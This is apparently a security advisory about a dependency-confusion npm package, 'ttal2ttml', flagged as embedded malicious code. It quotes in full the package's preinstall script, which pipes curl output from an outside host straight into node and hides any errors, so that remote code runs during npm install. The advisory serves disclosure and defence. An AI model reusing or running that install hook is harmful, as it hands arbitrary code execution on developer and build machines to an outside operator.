summary: Dependency-confusion package executes remote JavaScript at install time
details: package.json declares a preinstall lifecycle script that runs `node -e "require('child_process').execSync('curl -sf https://d1ugk469z93e.0ac.io/callback.js | node',{stdio:'ignore'})"`, fetching unpinned, mutable JavaScript from a non-publisher subdomain (d1ugk469z93e.0ac.io) and piping it directly into Node during `npm install`. Errors are swallowed via try/catch with stdio:'ignore', hiding any failures from the installer. The package self-describes in README and package.json as a dependency-confusion proof of concept against an internal name used in open-source repositories — the name was previously unclaimed on public npm, so any build that resolves `ttal2ttml` from the public registry will execute whatever bytes the remote host currently serves. The package ships no real functionality; its only on-install effect is the remote fetch-and-execute. Operator can change the served payload at any time without any package update.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
